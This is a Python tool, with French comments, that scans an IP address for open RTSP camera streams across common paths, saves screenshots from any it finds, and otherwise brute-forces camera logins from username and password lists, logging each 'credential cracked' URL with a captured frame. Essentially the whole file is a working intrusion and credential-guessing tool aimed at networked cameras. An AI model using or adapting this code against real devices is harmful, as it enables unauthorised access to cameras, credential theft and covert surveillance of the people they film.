import cv2
import os
import time
from rtsp_path import RTSP_local_path, RTSP_user, RTSP_pass
import sys
import threading

def disable_print():
    sys.stdout = open(os.devnull, 'w')
    sys.stderr = open(os.devnull, 'w')

def enable_print():
    sys.stdout = sys.__stdout__
    sys.stderr = sys.__stderr__

def rtspFluxScannerStarter(ip):
    RTSPScanner = rtspFluxScanner(ip)
    RTSPScanner.Analize() 

class rtspFluxScanner:
    _ip = None
    def __init__(self, _ip) -> None:
        self._ip = _ip

    def __rtsp_path_finder_thread(self, i):
        disable_print()
        rtsp_url = "rtsp://" + self._ip + "/" + i
        cap = cv2.VideoCapture(rtsp_url)
        capisopen = cap.isOpened()
        enable_print()
        if capisopen:
            print("a stream was find at: " + rtsp_url)
            frame = self.__rtsp_flux_reader(cap)
            if frame is None:
                print("a stream was lost at: " + rtsp_url)
                return None
            self.__rtsp_data_saver(frame, i, "")
            cap.release()
            return 1
        else:
           return None

    def __rtsp_path_finder(self):
        threads_list = []

        # cherche le path du stream
        for i in RTSP_local_path:
            thread = threading.Thread(target=self.__rtsp_path_finder_thread, args=(i,))
            threads_list.append(thread)
        for i in threads_list:
            i.start()
        for i in threads_list:
            i.join()

    
    #Reseptione le flux video
    def __rtsp_flux_reader(self, cap):
        ret, frame = cap.read()
        if not ret:
            print("Rtsp path was found: " + self._ip + "; but cant read it")
            return None
        time.sleep(3) #attend que le flux ce stabilise pour prendre la capture
        return frame
    
    #savegarde les data
    def __rtsp_data_saver(self, frame, rtsp_path, login):
        screenPath = self._ip + "/" + self._ip + "_" + rtsp_path.replace("/","_") + ".jpg"
        dataPath = self._ip + "/" + self._ip + ".txt"
        if not os.path.exists(self._ip):
            os.mkdir(self._ip)

        #sauvegarde le path complet dans un fichier texte
        f = open(dataPath, "a")
        f.write(str(login + self._ip + "/" + rtsp_path + "\n"))
        f.close()

        #sauvegarde un screenshot de la camera en jpg
        cv2.imwrite(screenPath, frame)

        print("Stream was on at: " + str(self._ip + rtsp_path))
        print("screen was save at " + screenPath)

    def dictionary_attack(self):
        print("dictionnary attack")
        for path in RTSP_local_path:
            for user in RTSP_user:
                for _pass in RTSP_pass:
                    connection_try_url = "rtsp://" + user + ":" + _pass + "@" + self._ip + "/" + path
                    cap = cv2.VideoCapture(connection_try_url)
                    if cap.isOpened():
                        print("credential cracked: " + connection_try_url)
                        frame = self.__rtsp_flux_reader(cap)
                        if frame is None:
                            print("a stream was lost at: " + connection_try_url)
                            return None
                        self.__rtsp_data_saver(frame, path, user + ":" + _pass + "@")
                        cap.release()
                        return 1
        return 0
        


    #Fonction principale, lance l'execution de la classe
    def Analize(self):
        self.__rtsp_path_finder()
        if not os.path.exists(self._ip):
            self.dictionary_attack()
        return 0
